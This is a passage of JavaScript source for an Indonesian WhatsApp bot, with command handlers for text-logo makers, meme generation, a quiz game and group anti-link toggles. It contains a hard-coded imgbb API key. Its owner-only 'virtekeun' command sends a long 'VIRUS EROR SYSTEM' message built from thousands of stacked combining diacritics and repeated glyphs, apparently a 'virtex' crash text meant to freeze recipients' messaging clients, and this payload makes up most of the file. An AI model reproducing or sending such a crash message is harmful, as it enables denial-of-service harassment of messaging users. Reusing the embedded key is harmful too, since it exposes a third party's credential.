					  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}googlemaker Tolol|Test|Anjay`)
				reply('Bentar lagi di proses')
SyaGanz = body.slice(6)
anu = await fetchJson(`https://rest-api-megumin1.herokuapp.com/api/textmaker/metallic?text=${SyaGanz}&theme=neon&apikey=beta`)
shit = `Test`
syaa.sendMessage(from, image, {quoted: mek, caption: shit})
break
case "pubglogo":
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
  if (isBanned)return reply(mess.ban)
				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}pubglogo Arasya|Ganz`)
				reply('Sebentar lagi di buat')
     ct = body.slice(9)
     memek1 = ct.split("|")[0];
     memek2 = ct.split("|")[1];
     anu = await fetchJson(`https://rest-api-megumin1.herokuapp.com/api/textmaker/game?text=${memek1}&text2=${memek2}&theme=pubg&apikey=beta`)
     buffer = await getBuffer(anu.result.url)
     syaa.sendMessage(from, buffer, image, {quoted: mek, caption: 'nih kack'})
     break
case 'mediafire': //By Arga
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
				reply(mess.wait)
anu = await fetchJson(`https://bx-hunter.herokuapp.com/api/mediafiredl?url=${args[0]}/file&apikey=Ikyy69`, {method: 'get'})
buffer = await getBuffer(anu.download)
teks = `Nama File : ${anu.title}
Creator : ${anu.creator}
File Size : ${anu.fileSize}
Tanggal Upload : ${anu.uploadAt}
Link Download : ${anu.urlDown}`
syaa.sendMessage(from, teks, text, {quoted: mek})
costum(buffer, MessageType.document)
break
case "waifum":
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix + command}Arasya|Ganz`)
				reply(mess.wait)
     ct = body.slice(8)
     memek1 = ct.split("|")[0];
     memek2 = ct.split("|")[1];
     anu = await fetchJson(`https://hardianto-chan.herokuapp.com/api/bot/gfx4?apikey=hardianto&text1=${memek1}&text2=${memek2}`)
     buffer = await getBuffer(anu.result.url)
     syaa.sendMessage(from, buffer, image, {quoted: mek, caption: 'nih kack'})
     break
case "ctahta":
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}ctahta Arasya|Ganteng|`)
				reply('Sebentar lagi di buat')
     ct = body.slice(9)
     memek1 = ct.split("|")[0];
     memek2 = ct.split("|")[1];
     memek3 = ct.split("|")[2];
     anu = await fetchJson(`https://hardianto-chan.herokuapp.com/api/customtahta?query=${memek1}\n${memek2}\n${memek3}&apikey=hardianto`)
     buffer = await getBuffer(anu.result.url)
     syaa.sendMessage(from, buffer, image, {quoted: mek, caption: 'nih kack'})
     break
case 'stcmeme':
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
 if (isBanned)return reply(mess.ban)
  ct = body.slice(9)
              top = ct.split('|')[0]
              bottom = ct.split('|')[1]
              var imgbb = require('imgbb-uploader')
              if ((isMedia && !mek.message.videoMessage || isQuotedImage || isQuotedSticker) && args.length > 0) {
              reply(mess.wait)
              ger = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
              owgi = await syaa.downloadAndSaveMediaMessage(ger)
              anu = await imgbb("520bd6f6209077d1777c2a4f20c509c2", owgi)
              teks = `${anu.display_url}`
              ranp = getRandom('.gif')
              rano = getRandom('.webp')
              anu1 = `https://api.memegen.link/images/custom/${top}/${bottom}.png?background=${teks}`
              sendStickerFromUrl(from, `${anu1}`, mess.success)
              } else {
              reply('Gunakan foto/stiker!')
}
               break
case 'memegenerator':
    case 'memegen':
      if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
   if (isBanned) return reply(mess.ban)
   
   if (args.length < 1) return reply(`Kirim perintah *${prefix + command}* teks atas|teks bawah`)
   if (!q.includes('|')) return reply(`Kirim perintah *${prefix + command}* teks atas|teks bawah`)
   try {
   if (!isQuotedImage && !isQuotedSticker) return reply(`REPLY GAMBAR ATAU STICKER!!`)
   reply(mess.wait)
   var teks1 = q.split('|')[0] ? q.split('|')[0] : ''
   var teks2 = q.split('|')[1] ? q.split('|')[1] : ''
   var imgbb = require('imgbb-uploader')
   var enmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
   var media = await syaa.downloadAndSaveMediaMessage(enmedia)
   var njay = await imgbb('520bd6f6209077d1777c2a4f20c509c2', media)
   var resu = await getBuffer(`https://api.memegen.link/images/custom/${teks1}/${teks2}.png?background=${njay.display_url}`)
   syaa.sendMessage(from, resu, image, {quoted: mek})
    fs.unlinkSync(media)
    } catch (e) {
    return reply(`${e}`)
    console.log(e)
    }
   break
/*case 'pornhub':
                
                case 'avenger':
                case 'space':
                case 'ninjalogo':
                case 'marvelstudio':
                case 'lionlogo':
                case 'wolflogo':
                case 'steel3d':
                case 'wallgravity':
                
				reply("Loading.....")
                    if (args.length == 0) return reply(`Example: ${prefix + command} LoL Human`)
                    txt1 = args[0]
                    txt2 = args[1]
                    ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/textprome2/${command}?apikey=pemburuBansos&text1=${txt1}&text2=${txt2}`)
                    syaa.sendMessage(from, ini_buffer, image, { quoted: mek })
                    break*/
case 'tahta':
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
				if (isBanned) return reply(mess.ban)
				dapuhy = body.slice(7)
				reply("loading.....")
				asu = await getBuffer(`https://api.zeks.xyz/api/hartatahta?text=${dapuhy}&apikey=apivinz`)
				syaa.sendMessage(from, asu, image, {quoted: mek})
				break
case "caklontong":
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
  if (isBanned) return reply(mess.ban)
   anu = await fetchJson(`https://rest-api-megumin1.herokuapp.com/api/kuis/caklontong?apikey=beta`)
   cak = `*${anu.result.soal}*`
   setTimeout( () => {
   reply('*➸ Jawaban :* '+anu.result.jawaban, text, {quoted: mek}) // ur cods
   }, 30000) // 1000 = 1s,
   setTimeout( () => {
   reply('_10 Detik lagi…_', text) // ur cods
   }, 20000) // 1000 = 1s,
   setTimeout( () => {
   reply('_20 Detik lagi_…', text) // ur cods
   }, 10000) // 1000 = 1s,
   setTimeout( () => {
   reply('_30 Detik lagi_…', text) // ur cods
   }, 2500) // 1000 = 1s,
   setTimeout( () => {
   syaa.sendMessage(from, cak, text, {quoted: mek }) // ur cods
   }, 0) // 1000 = 1s,
   break
      //------------------< Fitur Anti antian >-------------------
      case "antilink":
        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
        if (!isGroup) return reply("Khusus di grup");
        if (!isGroupAdmins && !mek.key.fromMe) return reply("Khusus admin");
        if (!isBotGroupAdmins) return reply("Jadikan Bot Sebagai Admin Untuk Menggunakan Fitur Tersebut");
        if (args[0] == "on") {
          if (isAntilink) return reply("Sudah aktif!!");
          antilink.push(from);
          fs.writeFileSync(
            "./database/antilink.json",
            JSON.stringify(antilink)
          );
          reply("Sukses mengaktifkan antilink!");
        } else if (args[0] == "off") {
          antilink.splice(from, 1);
          fs.writeFileSync(
            "./database/antilink.json",
            JSON.stringify(antilink)
          );
          reply("Sukses mematikan antilink!");
        } else if (!q) {
          sendButMessage(from, `MODE ANTILINK`, `Silahkan pilih salah satu`, [
            {
              buttonId: `${prefix}antilink on`,
              buttonText: {
                displayText: `on`,
              },
              type: 1,
            },
            {
              buttonId: `${prefix}antilink off`,
              buttonText: {
                displayText: `off`,
              },
              type: 1,
            },
          ]);
        }
        break;
      case "antihidetag":
        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
        if (!isGroup) return reply("Khusus di grup");
        if (!isGroupAdmins && !mek.key.fromMe) return reply("Khusus admin");
        if (args[0] == "on") {
          if (isAntihidetag) return reply("Sudah aktif!!");
          antihidetg.push(from);
          fs.writeFileSync(
            "./database/antihidetag.json",
            JSON.stringify(antihidetg)
          );
          reply("Sukses mengaktifkan antihidetag!");
        } else if (args[0] == "off") {
          antihidetg.splice(from, 1);
          fs.writeFileSync(
            "./database/antihidetag.json",
            JSON.stringify(antihidetg)
          );
          reply("Sukses mematikan antihidetag!");
        } else if (!q) {
          sendButMessage(
            from,
            `MODE ANTIHIDETAG`,
            `Silahkan pilih salah satu`,
            [
              {
                buttonId: `${prefix}antihidetag on`,
                buttonText: {
                  displayText: `on`,
                },
                type: 1,
              },
              {
                buttonId: `${prefix}antihidetag off`,
                buttonText: {
                  displayText: `off`,
                },
                type: 1,
              },
            ]
          );
        }
        break;
      case "antiviewonce":
        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
        if (!isGroup) return reply("Khusus di grup");
        if (!isGroupAdmins && !mek.key.fromMe) return reply("Khusus admin");
        if (args[0] == "on") {
          if (isAntiviewonce) return reply("Sudah aktif!!");
          antivo.push(from);
          fs.writeFileSync("./database/antivo.json", JSON.stringify(antivo));
          reply("Sukses mengaktifkan antiviewonce!");
        } else if (args[0] == "off") {
          antivo.splice(from, 1);
          fs.writeFileSync("./database/antivo.json", JSON.stringify(antivo));
          reply("Sukses mematikan antiviewonce!");
        } else if (!q) {
          sendButMessage(
            from,
            `MODE ANTIVIEWONCE`,
            `Silahkan pilih salah satu`,
            [
              {
                buttonId: `${prefix}antiviewonce on`,
                buttonText: {
                  displayText: `on`,
                },
                type: 1,
              },
              {
                buttonId: `${prefix}antiviewonce off`,
                buttonText: {
                  displayText: `off`,
                },
                type: 1,
              },
            ]
          );
        }
        break;
        
case 'asupan':
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
  if (!isBanned) return reply("Maaf Teradi Kesalahan")
			syaa.updatePresence(from, Presence.composing) 
				reply(mess.wait)
				data = fs.readFileSync('./lib/asupan.js');
				jsonData = JSON.parse(data);
				randIndex = Math.floor(Math.random() * jsonData.length);
				randKey = jsonData[randIndex];
				asupan = await getBuffer(randKey.result)
				syaa.sendMessage(from, asupan, video, {quoted: mek, caption: '```ASUPAN NIH:V```'})
				break        
case 'asupan2':
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
  if (!isBanned)return reply("maaf terjsdi kesalahan")
			syaa.updatePresence(from, Presence.composing) 
				reply(mess.wait)
				data = fs.readFileSync('./lib/asupan2.js');
				jsonData = JSON.parse(data);
				randIndex = Math.floor(Math.random() * jsonData.length);
				randKey = jsonData[randIndex];
				asupan = await getBuffer(randKey.result)
				syaa.sendMessage(from, asupan, video, {quoted: mek, caption: '```ASUPAN NIH:V```'})
				break
///𝑃𝐼𝑅𝑇𝐸𝐾
 case "virtekeun":
   if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
        if (!isOwner && !mek.key.fromMe) return sticOwner(from)    
   reply(`🇮🇮🇩⃢⃞⃝     🇮🇩⃢⃞⃝۝̶ *VIRUS 🇮🇩⃢⃞⃝۝̶ EROR SYSTEM۝⃢⃞̶*۝⃢⃞̶🇮🇩
🇮🇩⃢⃞⃝۝̶ *EROR SYSTEM*۝⃢⃞̶🇮🇩
🇮🇩⃢⃞⃝۝̶ *EROR System'*۝⃢⃞̶🇮🇩
*9999999* *ผิดุท้่                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          
*9999999* *ผิดุท้่เึางืผิดุท้่เึางื* *9999999*
*9999999* *ผิดุท้่เึางืผิดุท้่เึางื* *9999999*
*9999999* *ผิดุท้่เึางืผิดุท้่เึางื* *9999999*
*9999999* *ผิดุท้่เึางืผิดุท้่เึางื* *9999999*
*9999999* *ผิดุท้่เึางืผิดุท้่เึางื* *9999999*
*9999999* *ผิดุท้่เึางืผิดุท้่เึางื* *9999999*
*9999999* *ผิดุท้่เึางืผิดุท้่เึางื* *9999999*
*9999999* *ผิดุท้่เึางืผิดุท้่เึางื* *9999999*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒*ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍَََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََََُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُُِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِِّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّّْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْْ* ҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴ 
*9999999* *ผิดุท้่เึางืผิดุท้่เึางื* *9999999*
*9999999* *ผิดุท้่เึางืผิดุท้่เึางื* *9999999*
*9999999* *ผิดุท้่เึางืผิดุท้่เึางื* *9999999*
*9999999* *ผิดุท้่เึางืผิดุท้่เึางื* *9999999*
